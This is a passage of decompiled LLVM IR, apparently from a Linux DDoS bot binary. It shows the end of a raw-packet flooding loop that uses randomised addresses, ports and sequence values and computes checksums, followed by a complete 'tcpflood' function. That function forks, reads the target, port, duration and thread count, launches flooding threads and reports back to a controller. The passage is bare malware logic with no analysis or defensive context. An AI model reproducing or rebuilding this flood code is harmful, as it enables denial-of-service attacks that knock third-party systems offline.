  store i32 %v2_804f195, i32* %eax.global-to-local, align 4
  store i32 %v2_804f255, i32* %edx.global-to-local, align 4
  %v5_804f719 = icmp ult i32 %v0_804f719, 8
  store i1 %v5_804f719, i1* %cf.global-to-local, align 1
  %v1_804f71c = add i32 %v0_804f719, -12
  %v2_804f71c = inttoptr i32 %v1_804f71c to i32*
  store i32 16, i32* %v2_804f71c, align 4
  %v2_804f71e = add i32 %v0_804f719, -16
  %v3_804f71e = inttoptr i32 %v2_804f71e to i32*
  store i32 %v2_804f195, i32* %v3_804f71e, align 4
  %v1_804f71f = add i32 %v0_804f719, -20
  %v2_804f71f = inttoptr i32 %v1_804f71f to i32*
  store i32 0, i32* %v2_804f71f, align 4
  %v5_804f721 = add i32 %v0_804f719, -24
  %v6_804f721 = inttoptr i32 %v5_804f721 to i32*
  store i32 %v1_804f235, i32* %v6_804f721, align 4
  %v0_804f724 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f724 = add i32 %v0_804f719, -28
  %v3_804f724 = inttoptr i32 %v2_804f724 to i32*
  store i32 %v0_804f724, i32* %v3_804f724, align 4
  %v5_804f725 = add i32 %v0_804f719, -32
  %v6_804f725 = inttoptr i32 %v5_804f725 to i32*
  store i32 %v3_804f1cf, i32* %v6_804f725, align 4
  %v1_804f728 = load i32, i32* %stack_var_-96, align 4
  %v2_804f728 = load i32, i32* %stack_var_-92, align 4
  %v3_804f728 = load i32, i32* %stack_var_-88, align 4
  %v4_804f728 = load i32, i32* %stack_var_-84, align 4
  %v6_804f728 = call i32 @sendto(i32 %stack_var_-100.0, i32 %v1_804f728, i32 %v2_804f728, i32 %v3_804f728, i32 %v4_804f728, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804f728, i32* %eax.global-to-local, align 4
  %v0_804f72d = load i32, i32* @esp, align 4
  %v2_804f72d = icmp ugt i32 %v0_804f72d, -33
  store i1 %v2_804f72d, i1* %cf.global-to-local, align 1
  %v1_804f730 = load i32, i32* %stack_var_-96, align 4
  %v2_804f730 = call i32 @getRandomPublicIP(i32 %stack_var_-100.0, i32 %v1_804f730)
  store i32 %v2_804f730, i32* %eax.global-to-local, align 4
  %v0_804f735 = load i32, i32* @esp, align 4
  %v5_804f735 = icmp ult i32 %v0_804f735, 12
  store i1 %v5_804f735, i1* %cf.global-to-local, align 1
  %v2_804f738 = add i32 %v0_804f735, -16
  %v3_804f738 = inttoptr i32 %v2_804f738 to i32*
  store i32 %v2_804f730, i32* %v3_804f738, align 4
  %v1_804f739 = call i32 @htonl(i32 %stack_var_-100.0)
  %v0_804f73e = load i32, i32* @esp, align 4
  %v2_804f73e = icmp ugt i32 %v0_804f73e, -17
  store i1 %v2_804f73e, i1* %cf.global-to-local, align 1
  store i32 %v1_804f739, i32* %edx.global-to-local, align 4
  store i32 %v2_804f255, i32* %eax.global-to-local, align 4
  store i32 %v1_804f739, i32* %v3_804f746, align 4
  %v1_804f749 = call i32 @rand_cmwc(i32 %stack_var_-100.0)
  %sext13 = mul i32 %v1_804f749, 65536
  %v1_804f74e = sdiv i32 %sext13, 65536
  store i32 %v1_804f74e, i32* %edx.global-to-local, align 4
  store i32 %v2_804f255, i32* %eax.global-to-local, align 4
  %v1_804f753 = trunc i32 %v1_804f74e to i16
  store i16 %v1_804f753, i16* %v4_804f753, align 4
  %v1_804f757 = call i32 @rand_cmwc(i32 %stack_var_-100.0)
  store i32 %v1_804f757, i32* %edx.global-to-local, align 4
  store i32 %v1_804f26d, i32* %eax.global-to-local, align 4
  store i32 %v1_804f757, i32* %v3_804f2c2, align 8
  %v1_804f764 = call i32 @rand_cmwc(i32 %stack_var_-100.0)
  %v1_804f76e = trunc i32 %v1_804f764 to i16
  store i16 %v1_804f76e, i16* %v5_804f270, align 4
  store i16 0, i16* %v2_804f676, align 4
  store i32 %v1_804f26d, i32* %eax.global-to-local, align 4
  store i32 %v2_804f255, i32* %edx.global-to-local, align 4
  %v1_804f780 = load i32, i32* @esp, align 4
  %v2_804f780 = add i32 %v1_804f780, -4
  %v3_804f780 = inttoptr i32 %v2_804f780 to i32*
  store i32 %v1_804f26d, i32* %v3_804f780, align 4
  %v0_804f781 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f781 = add i32 %v1_804f780, -8
  %v3_804f781 = inttoptr i32 %v2_804f781 to i32*
  store i32 %v0_804f781, i32* %v3_804f781, align 4
  %v1_804f782 = load i32, i32* %stack_var_-96, align 4
  %v2_804f782 = inttoptr i32 %stack_var_-100.0 to i16*
  %v3_804f782 = call i32 @csum(i16* %v2_804f782, i32 %v1_804f782)
  %v4_804f782 = trunc i32 %v3_804f782 to i16
  %sext22 = mul i32 %v3_804f782, 65536
  %v1_804f78a = sdiv i32 %sext22, 65536
  store i32 %v1_804f78a, i32* %edx.global-to-local, align 4
  store i16 %v4_804f782, i16* %v2_804f676, align 4
  store i32 %v2_804f255, i32* %eax.global-to-local, align 4
  %v3_804f796 = load i16, i16* %v2_804f6d5, align 2
  %v4_804f796 = zext i16 %v3_804f796 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804f796, i32* %edx.global-to-local, align 4
  store i32 %v2_804f255, i32* %eax.global-to-local, align 4
  %v1_804f7a5 = load i32, i32* @esp, align 4
  %v2_804f7a5 = add i32 %v1_804f7a5, -4
  %v3_804f7a5 = inttoptr i32 %v2_804f7a5 to i32*
  store i32 %v4_804f796, i32* %v3_804f7a5, align 4
  %v0_804f7a6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f7a6 = add i32 %v1_804f7a5, -8
  %v3_804f7a6 = inttoptr i32 %v2_804f7a6 to i32*
  store i32 %v0_804f7a6, i32* %v3_804f7a6, align 4
  %v1_804f7a7 = load i32, i32* %stack_var_-96, align 4
  %v3_804f7a7 = call i32 @csum(i16* %v2_804f782, i32 %v1_804f7a7)
  %v4_804f7a7 = trunc i32 %v3_804f7a7 to i16
  %sext23 = mul i32 %v3_804f7a7, 65536
  %v1_804f7af = sdiv i32 %sext23, 65536
  store i32 %v1_804f7af, i32* %edx.global-to-local, align 4
  store i32 %v2_804f255, i32* %eax.global-to-local, align 4
  store i16 %v4_804f7a7, i16* %v4_804f6f3, align 2
  store i32 %v3_804f14e, i32* @edi, align 4
  %v10_804f7bb = icmp ult i32 %stack_var_-100.0, %v3_804f14e
  store i1 %v10_804f7bb, i1* %cf.global-to-local, align 1
  %v15_804f7bb = icmp eq i32 %stack_var_-100.0, %v3_804f14e
  %v1_804f7be = icmp eq i1 %v15_804f7bb, false
  br i1 %v1_804f7be, label %dec_label_pc_804f7de, label %dec_label_pc_804f7c0

dec_label_pc_804f7c0:                             ; preds = %dec_label_pc_804f713
  %v0_804f7c0 = load i32, i32* @esp, align 4
  %v5_804f7c0 = icmp ult i32 %v0_804f7c0, 12
  store i1 %v5_804f7c0, i1* %cf.global-to-local, align 1
  %v1_804f7c3 = add i32 %v0_804f7c0, -16
  %v2_804f7c3 = inttoptr i32 %v1_804f7c3 to i32*
  store i32 0, i32* %v2_804f7c3, align 4
  %v1_804f7c5 = inttoptr i32 %stack_var_-100.0 to i32*
  %v2_804f7c5 = call i32 @__GI_time(i32* %v1_804f7c5)
  store i32 %v2_804f7c5, i32* %eax.global-to-local, align 4
  %v0_804f7ca = load i32, i32* @esp, align 4
  %v1_804f7ca = add i32 %v0_804f7ca, 16
  %v10_804f7cd = icmp ult i32 %v2_804f7c5, %v5_804f704
  store i1 %v10_804f7cd, i1* %cf.global-to-local, align 1
  %v8_804f7d0 = icmp sgt i32 %v2_804f7c5, %v5_804f704
  br i1 %v8_804f7d0, label %dec_label_pc_804f7e6, label %dec_label_pc_804f713

dec_label_pc_804f7de:                             ; preds = %dec_label_pc_804f713
  %v4_804f7de = add i32 %stack_var_-100.0, 1
  %v0_804f719.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f713

dec_label_pc_804f7e6:                             ; preds = %dec_label_pc_804f7c0, %dec_label_pc_804f1e5, %dec_label_pc_804f1b0, %dec_label_pc_804f192
  %v0_804f7f0 = phi i32 [ %v5_804f1fc, %dec_label_pc_804f1e5 ], [ %v3_804f1cf, %dec_label_pc_804f1b0 ], [ %v3_804f19f, %dec_label_pc_804f192 ], [ %v2_804f7c5, %dec_label_pc_804f7c0 ]
  ret i32 %v0_804f7f0

; uselistorder directives
  uselistorder i32 %v2_804f7c5, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804f74e, { 1, 0 }
  uselistorder i32 %v1_804f739, { 1, 0 }
  uselistorder i32 %stack_var_-100.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %v0_804f719, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_804f704, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804f6fc, { 1, 0 }
  uselistorder i32 %v1_804f6c1, { 1, 0 }
  uselistorder i32 %v1_804f699, { 1, 0 }
  uselistorder i32 %v1_804f66a, { 1, 0 }
  uselistorder i32 %v3_804f650, { 2, 1, 0, 3 }
  uselistorder i8* %stack_var_-224.0, { 1, 0 }
  uselistorder i32 %stack_var_-228.0, { 1, 0 }
  uselistorder i32 %v1_804f640, { 1, 0 }
  uselistorder i1 %v0_804f627, { 1, 0 }
  uselistorder i32 %v6_804f625, { 1, 0 }
  uselistorder i32 %v1_804f5ed, { 1, 0 }
  uselistorder i1 %v0_804f5d4, { 1, 0 }
  uselistorder i32 %v6_804f5d2, { 1, 0 }
  uselistorder i32 %v1_804f597, { 1, 0 }
  uselistorder i1 %v0_804f57e, { 1, 0 }
  uselistorder i32 %v6_804f57c, { 1, 0 }
  uselistorder i32 %v1_804f541, { 1, 0 }
  uselistorder i1 %v0_804f528, { 1, 0 }
  uselistorder i32 %v6_804f526, { 1, 0 }
  uselistorder i32 %v1_804f4eb, { 1, 0 }
  uselistorder i1 %v0_804f4d2, { 1, 0 }
  uselistorder i32 %v6_804f4d0, { 1, 0 }
  uselistorder i32 %v1_804f495, { 1, 0 }
  uselistorder i1 %v0_804f47c, { 1, 0 }
  uselistorder i32 %v6_804f47a, { 1, 0 }
  uselistorder i32 %v4_804f44a, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32 %stack_var_-228.134, { 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-224.135, { 4, 3, 2, 1, 0 }
  uselistorder i8* %v3_804f5f5, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804f63d, { 5, 11, 4, 10, 3, 9, 2, 8, 1, 7, 0, 6 }
  uselistorder i32 %v1_804f423, { 1, 0 }
  uselistorder i32 %v1_804f417, { 1, 0 }
  uselistorder i8* %v2_804f414, { 1, 2, 0, 3 }
  uselistorder i1 %v0_804f3fe, { 1, 0 }
  uselistorder i32 %v6_804f3fc, { 1, 0 }
  uselistorder i32 %v1_804f3c1, { 1, 0 }
  uselistorder i32 %v1_804f3b5, { 1, 0 }
  uselistorder i32 %v1_804f3a9, { 1, 0 }
  uselistorder i8* %v2_804f3a6, { 2, 3, 1, 4, 0, 5 }
  uselistorder i1 %v0_804f390, { 1, 0 }
  uselistorder i32 %v1_804f353, { 1, 0 }
  uselistorder i32 %v1_804f347, { 1, 0 }
  uselistorder i32 %v1_804f33b, { 1, 0 }
  uselistorder i32 %v1_804f32f, { 1, 0 }
  uselistorder i32 %v1_804f323, { 1, 0 }
  uselistorder i32 %v1_804f317, { 1, 0 }
  uselistorder i8* %v2_804f314, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 0, 11 }
  uselistorder i1 %v0_804f2fe, { 1, 0 }
  uselistorder i32 %v1_804f2b0, { 1, 0 }
  uselistorder i32 %v0_804f292, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_804f26d, { 11, 12, 13, 14, 15, 16, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 %v2_804f255, { 14, 13, 12, 11, 10, 9, 8, 26, 25, 24, 7, 6, 23, 5, 4, 22, 21, 20, 19, 29, 28, 27, 18, 17, 16, 15, 3, 2, 1, 0 }
  uselistorder i32 %v2_804f24a, { 1, 0, 2 }
  uselistorder i32 %v2_804f22b, { 1, 0 }
  uselistorder i32 %v3_804f1cf, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_804f17d, { 1, 0 }
  uselistorder i32 %v3_804f157, { 1, 0, 2 }
  uselistorder i32 %v3_804f14e, { 0, 2, 1, 3 }
  uselistorder i32 %v3_804f145, { 0, 2, 1 }
  uselistorder i32 %v3_804f13c, { 0, 2, 1, 4, 3, 7, 6, 5 }
  uselistorder i32* %stack_var_-236, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-92, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-88, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-84, { 1, 0, 2 }
  uselistorder i32* %stack_var_-96, { 2, 3, 1, 0, 5, 4 }
  uselistorder i32 %tmp97, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 12, 11, 10 }
  uselistorder i8** %stack_var_-20, { 2, 3, 0, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 31, 28, 29, 30, 32, 39, 33, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i1* %cf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 34, 15, 16, 17, 19, 18, 20, 22, 21, 23, 25, 24, 26, 28, 27, 29, 31, 30, 32, 33, 0, 35, 36, 37, 38, 42, 39, 40, 41, 43, 50, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendto, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @htonl, { 8, 7, 6, 5, 4, 2, 3, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f713, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f6ae, { 1, 0 }
  uselistorder label %dec_label_pc_804f646, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804f44a, { 1, 0 }
  uselistorder label %dec_label_pc_804f232, { 1, 0 }
  uselistorder label %bb117, { 1, 0 }
  uselistorder label %dec_label_pc_804f192, { 1, 0 }
}

define i32 @tcpflood(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f7f1 = load i32, i32* @ebp, align 4
  store i32 %v0_804f7f1, i32* %stack_var_-4, align 4
  %v4_804f7f1 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804f7f1, i32* @ebp, align 4
  %v0_804f7f4 = load i32, i32* @ebx, align 4
  %v15_804f7f5 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v15_804f7f5, i32* @eax, align 4
  %v1_804f803 = call i32 @mfork(i32 %arg2)
  store i32 %v1_804f803, i32* %eax.global-to-local, align 4
  %v1_804f80b = icmp eq i32 %v1_804f803, 0
  %v1_804f80d = icmp eq i1 %v1_804f80b, false
  br i1 %v1_804f80d, label %dec_label_pc_804fb5e, label %dec_label_pc_804f813

dec_label_pc_804f813:                             ; preds = %entry
  %v7_804f817 = icmp sgt i32 %arg3, 5
  br i1 %v7_804f817, label %dec_label_pc_804f819, label %dec_label_pc_804f887

dec_label_pc_804f819:                             ; preds = %dec_label_pc_804f813
  %v1_804f81c = add i32 %arg4, 12
  store i32 %v1_804f81c, i32* %eax.global-to-local, align 4
  %v1_804f81f = inttoptr i32 %v1_804f81c to i32*
  %v2_804f81f = load i32, i32* %v1_804f81f, align 4
  store i32 %v2_804f81f, i32* %eax.global-to-local, align 4
  %v1_804f825 = call i32 @atol(i32 %v2_804f81f)
  store i32 %v1_804f825, i32* %eax.global-to-local, align 4
  %v10_804f82d = icmp eq i32 %v1_804f825, -1
  br i1 %v10_804f82d, label %dec_label_pc_804f887, label %dec_label_pc_804f832

dec_label_pc_804f832:                             ; preds = %dec_label_pc_804f819
  %v1_804f835 = add i32 %arg4, 8
  store i32 %v1_804f835, i32* %eax.global-to-local, align 4
  %v1_804f838 = inttoptr i32 %v1_804f835 to i32*
  %v2_804f838 = load i32, i32* %v1_804f838, align 4
  store i32 %v2_804f838, i32* %eax.global-to-local, align 4
  %v1_804f83e = call i32 @atol(i32 %v2_804f838)
  store i32 %v1_804f83e, i32* %eax.global-to-local, align 4
  %v10_804f846 = icmp eq i32 %v1_804f83e, -1
  br i1 %v10_804f846, label %dec_label_pc_804f887, label %dec_label_pc_804f851

dec_label_pc_804f851:                             ; preds = %dec_label_pc_804f832
  %v1_804f854 = add i32 %arg4, 20
  store i32 %v1_804f854, i32* %eax.global-to-local, align 4
  %v1_804f857 = inttoptr i32 %v1_804f854 to i32*
  %v2_804f857 = load i32, i32* %v1_804f857, align 4
  store i32 %v2_804f857, i32* %eax.global-to-local, align 4
  %v1_804f85d = call i32 @atol(i32 %v2_804f857)
  store i32 %v1_804f85d, i32* %eax.global-to-local, align 4
  %v2_804f865 = icmp slt i32 %v1_804f85d, 0
  br i1 %v2_804f865, label %dec_label_pc_804f887, label %dec_label_pc_804f869

dec_label_pc_804f869:                             ; preds = %dec_label_pc_804f851
  %v12_804f869 = icmp eq i32 %arg3, 7
  %v1_804f86d = icmp eq i1 %v12_804f869, false
  br i1 %v1_804f86d, label %dec_label_pc_804f90c, label %dec_label_pc_804f86f

dec_label_pc_804f86f:                             ; preds = %dec_label_pc_804f869
  %v1_804f872 = add i32 %arg4, 24
  store i32 %v1_804f872, i32* %eax.global-to-local, align 4
  %v1_804f875 = inttoptr i32 %v1_804f872 to i32*
  %v2_804f875 = load i32, i32* %v1_804f875, align 4
  store i32 %v2_804f875, i32* %eax.global-to-local, align 4
  %v1_804f87b = call i32 @atol(i32 %v2_804f875)
  store i32 %v1_804f87b, i32* %eax.global-to-local, align 4
  %tmp38 = icmp slt i32 %v1_804f87b, 1
  %tmp39 = icmp eq i1 %tmp38, false
  br i1 %tmp39, label %dec_label_pc_804f90c, label %dec_label_pc_804f887

dec_label_pc_804f887:                             ; preds = %dec_label_pc_804f813, %dec_label_pc_804f86f, %dec_label_pc_804f851, %dec_label_pc_804f832, %dec_label_pc_804f819
  %v3_804f895 = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_806a064.254 to i32))
  store i32 %v3_804f895, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fb5e

dec_label_pc_804f90c:                             ; preds = %dec_label_pc_804f86f, %dec_label_pc_804f869
  %v1_804f8a5 = add i32 %arg4, 4
  store i32 %v1_804f8a5, i32* %eax.global-to-local, align 4
  %v1_804f8a8 = inttoptr i32 %v1_804f8a5 to i32*
  %v2_804f8a8 = load i32, i32* %v1_804f8a8, align 4
  store i32 %v1_804f835, i32* %eax.global-to-local, align 4
  %v2_804f8b3 = load i32, i32* %v1_804f838, align 4
  store i32 %v2_804f8b3, i32* %eax.global-to-local, align 4
  %v1_804f8b9 = call i32 @atol(i32 %v2_804f8b3)
  store i32 %v1_804f81c, i32* %eax.global-to-local, align 4
  %v2_804f8ca = load i32, i32* %v1_804f81f, align 4
  store i32 %v2_804f8ca, i32* %eax.global-to-local, align 4
  %v1_804f8d0 = call i32 @atol(i32 %v2_804f8ca)
  %v1_804f8de = add i32 %arg4, 16
  store i32 %v1_804f8de, i32* %eax.global-to-local, align 4
  %v1_804f8e1 = inttoptr i32 %v1_804f8de to i32*
  %v2_804f8e1 = load i32, i32* %v1_804f8e1, align 4
  store i32 %v1_804f854, i32* %eax.global-to-local, align 4
  %v2_804f8f2 = load i32, i32* %v1_804f857, align 4
  store i32 %v2_804f8f2, i32* %eax.global-to-local, align 4
  %v1_804f8f8 = call i32 @atol(i32 %v2_804f8f2)
  store i32 %v1_804f8f8, i32* %stack_var_-92, align 4
  store i32 %v1_804f8f8, i32* %eax.global-to-local, align 4
  br i1 %v1_804f86d, label %dec_label_pc_804f938, label %dec_label_pc_804f918

dec_label_pc_804f918:                             ; preds = %dec_label_pc_804f90c
  %v1_804f91b = add i32 %arg4, 24
  store i32 %v1_804f91b, i32* %eax.global-to-local, align 4
  %v1_804f91e = inttoptr i32 %v1_804f91b to i32*
  %v2_804f91e = load i32, i32* %v1_804f91e, align 4
  store i32 %v2_804f91e, i32* %eax.global-to-local, align 4
  %v1_804f924 = call i32 @atol(i32 %v2_804f91e)
  store i32 %v1_804f924, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f938

dec_label_pc_804f938:                             ; preds = %dec_label_pc_804f90c, %dec_label_pc_804f918
  %storemerge2 = phi i32 [ %v1_804f924, %dec_label_pc_804f918 ], [ 10, %dec_label_pc_804f90c ]
  %v1_804f941 = add i32 %arg4, 28
  store i32 %v1_804f941, i32* %eax.global-to-local, align 4
  %v1_804f944 = inttoptr i32 %v1_804f941 to i32*
  %v2_804f944 = load i32, i32* %v1_804f944, align 4
  store i32 %v2_804f944, i32* %eax.global-to-local, align 4
  %v1_804f94a = call i32 @atol(i32 %v2_804f944)
  store i32 %v1_804f8a5, i32* %eax.global-to-local, align 4
  %v2_804f968 = load i32, i32* %v1_804f8a8, align 4
  store i32 %v2_804f968, i32* %eax.global-to-local, align 4
  %v1_804f96e = call i32 @inet_addr(i32 %v2_804f968)
  %v2_804f97c = mul i32 %v1_804f94a, 4
  %v1_804f982 = add i32 %v2_804f97c, 30
  %v2_804f985 = and i32 %v1_804f982, -16
  %v2_804f98b = sub i32 %v15_804f7f5, %v2_804f985
  %v1_804f993 = add i32 %v2_804f98b, 15
  %v2_804f996 = and i32 %v1_804f993, -16
  %v2_804f9b6 = mul i32 %v1_804f94a, 28
  %v1_804f9bb = add i32 %v2_804f9b6, 30
  %v2_804f9be = and i32 %v1_804f9bb, -16
  %v2_804f9c4 = sub i32 %v2_804f98b, %v2_804f9be
  %v1_804f9cc = add i32 %v2_804f9c4, 15
  %v2_804f9cf = and i32 %v1_804f9cc, -16
  store i32 %v2_804f8a8, i32* @eax, align 4
  %v1_804f9e4 = add i32 %v2_804f9c4, -12
  %v2_804f9e4 = inttoptr i32 %v1_804f9e4 to i32*
  store i32 ptrtoint (i32* @global_var_806986d.168 to i32), i32* %v2_804f9e4, align 4
  %v0_804f9e9 = load i32, i32* @eax, align 4
  %v2_804f9e9 = add i32 %v2_804f9c4, -16
  %v3_804f9e9 = inttoptr i32 %v2_804f9e9 to i32*
  store i32 %v0_804f9e9, i32* %v3_804f9e9, align 4
  %v2_804f9ea = call i32 @__GI_strtok(i32 %v2_804f996, i32 %v2_804f9cf)
  %v0_804f9ef = load i32, i32* @esp, align 4
  %v1_804fb19 = add i32 %v1_804f94a, -1
  store i32 %v1_804fb19, i32* %eax.global-to-local, align 4
  %v8_804fb1d41 = icmp sgt i32 %v1_804fb19, 0
  br i1 %v8_804fb1d41, label %dec_label_pc_804fa01, label %dec_label_pc_804fb23

dec_label_pc_804fa01:                             ; preds = %dec_label_pc_804f938, %dec_label_pc_804fa01
  %storemerge42 = phi i32 [ %v4_804fb13, %dec_label_pc_804fa01 ], [ 0, %dec_label_pc_804f938 ]
  %v2_804fa18 = mul i32 %storemerge42, 28
  %v3_804fa1a = add i32 %v2_804fa18, %v2_804f9cf
  %v4_804fa1a = inttoptr i32 %v3_804fa1a to i32*
  store i32 %storemerge42, i32* %v4_804fa1a, align 4
  %v1_804fa35 = add i32 %v3_804fa1a, 4
  %v2_804fa3b = inttoptr i32 %v1_804fa35 to i32*
  store i32 %v1_804f8b9, i32* %v2_804fa3b, align 4
  %v1_804fa55 = add i32 %v3_804fa1a, 8
  %v2_804fa5b = inttoptr i32 %v1_804fa55 to i32*
  store i32 %v1_804f8d0, i32* %v2_804fa5b, align 4
  %v1_804fa75 = add i32 %v3_804fa1a, 12
  %v2_804fa7b = inttoptr i32 %v1_804fa75 to i32*
  store i32 %v2_804f8e1, i32* %v2_804fa7b, align 4
  %v1_804fa95 = add i32 %v3_804fa1a, 16
  %v2_804fa9b = inttoptr i32 %v1_804fa95 to i32*
  store i32 %v1_804f8f8, i32* %v2_804fa9b, align 4
  %v1_804fab5 = add i32 %v3_804fa1a, 20
  %v2_804fabb = inttoptr i32 %v1_804fab5 to i32*
  store i32 %storemerge2, i32* %v2_804fabb, align 4
  %v1_804fad5 = add i32 %v3_804fa1a, 24
  %v2_804fadb = inttoptr i32 %v1_804fad5 to i32*
  store i32 32, i32* %v2_804fadb, align 4
  store i32 %v3_804fa1a, i32* @ecx, align 4
  store i32 134541576, i32* @ebx, align 4
  %v2_804fb00 = mul i32 %storemerge42, 4
  %v2_804fb03 = add i32 %v2_804fb00, %v2_804f996
  store i32 %v2_804fb03, i32* %eax.global-to-local, align 4
  %v1_804fb06 = load i32, i32* @esp, align 4
  %v2_804fb06 = add i32 %v1_804fb06, -4
  %v3_804fb06 = inttoptr i32 %v2_804fb06 to i32*
  store i32 %v3_804fa1a, i32* %v3_804fb06, align 4
  %v0_804fb07 = load i32, i32* @ebx, align 4
  %v2_804fb07 = add i32 %v1_804fb06, -8
  %v3_804fb07 = inttoptr i32 %v2_804fb07 to i32*
  store i32 %v0_804fb07, i32* %v3_804fb07, align 4
  %v1_804fb08 = add i32 %v1_804fb06, -12
  %v2_804fb08 = inttoptr i32 %v1_804fb08 to i32*
  store i32 0, i32* %v2_804fb08, align 4
  %v0_804fb0a = load i32, i32* %eax.global-to-local, align 4
  %v2_804fb0a = add i32 %v1_804fb06, -16
  %v3_804fb0a = inttoptr i32 %v2_804fb0a to i32*
  store i32 %v0_804fb0a, i32* %v3_804fb0a, align 4
  %v2_804fb0b = load i32, i32* %stack_var_-4, align 4
  %v3_804fb0b = load i32, i32* %stack_var_0, align 4
  %v4_804fb0b = inttoptr i32 %storemerge42 to i32*
  %v5_804fb0b = call i32 @pthread_create(i32* %v4_804fb0b, i32 %v0_804f7f4, i32 %v2_804fb0b, i32 %v3_804fb0b)
  %v0_804fb10 = load i32, i32* @esp, align 4
  %v4_804fb13 = add nuw nsw i32 %storemerge42, 1
  store i32 %v1_804fb19, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_804fb19, %v4_804fb13
  br i1 %exitcond, label %dec_label_pc_804fb23, label %dec_label_pc_804fa01

dec_label_pc_804fb23:                             ; preds = %dec_label_pc_804fa01, %dec_label_pc_804f938
  %v0_804fb23.lcssa.in = phi i32 [ %v0_804f9ef, %dec_label_pc_804f938 ], [ %v0_804fb10, %dec_label_pc_804fa01 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_804f938 ], [ %v1_804fb19, %dec_label_pc_804fa01 ]
  %v5_804fb26 = add i32 %v0_804fb23.lcssa.in, 8
  %v6_804fb26 = inttoptr i32 %v5_804fb26 to i32*
  store i32 %v1_804f94a, i32* %v6_804fb26, align 4
  %v5_804fb29 = add i32 %v0_804fb23.lcssa.in, 4
  %v6_804fb29 = inttoptr i32 %v5_804fb29 to i32*
  store i32 %v2_804f8e1, i32* %v6_804fb29, align 4
  %v6_804fb2c = inttoptr i32 %v0_804fb23.lcssa.in to i32*
  store i32 %v1_804f8b9, i32* %v6_804fb2c, align 4
  %v5_804fb2f = add i32 %v0_804fb23.lcssa.in, -4
  %v6_804fb2f = inttoptr i32 %v5_804fb2f to i32*
  store i32 %v2_804f9ea, i32* %v6_804fb2f, align 4
  %v5_804fb32 = add i32 %v0_804fb23.lcssa.in, -8
  %v6_804fb32 = inttoptr i32 %v5_804fb32 to i32*
  store i32 %arg2, i32* %v6_804fb32, align 4
  %v1_804fb35 = add i32 %v0_804fb23.lcssa.in, -12
  %v2_804fb35 = inttoptr i32 %v1_804fb35 to i32*
  store i32 ptrtoint ([54 x i8]* @global_var_806a0c0.255 to i32), i32* %v2_804fb35, align 4
  %v5_804fb3a = add i32 %v0_804fb23.lcssa.in, -16
  %v6_804fb3a = inttoptr i32 %v5_804fb3a to i32*
  store i32 %arg1, i32* %v6_804fb3a, align 4
  %v2_804fb3d = call i32 @Send(i32 %storemerge.lcssa, i32 %v0_804f7f4)
  %v0_804fb42 = load i32, i32* @esp, align 4
  store i32 %v1_804f8d0, i32* %eax.global-to-local, align 4
  %v2_804fb4b = add i32 %v0_804fb42, 16
  %v3_804fb4b = inttoptr i32 %v2_804fb4b to i32*
  store i32 %v1_804f8d0, i32* %v3_804fb4b, align 4
  %v1_804fb4c = call i32 @sleep(i32 %storemerge.lcssa)
  store i32 %v1_804fb4c, i32* %eax.global-to-local, align 4
  %v0_804fb51 = load i32, i32* @esp, align 4
  %v2_804fb57 = inttoptr i32 %v0_804fb51 to i32*
  store i32 0, i32* %v2_804fb57, align 4
  %v1_804fb59 = call i32 @__GI_exit(i32 %storemerge.lcssa)
  store i32 %v1_804fb59, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fb5e

dec_label_pc_804fb5e:                             ; preds = %entry, %dec_label_pc_804f887, %dec_label_pc_804fb23
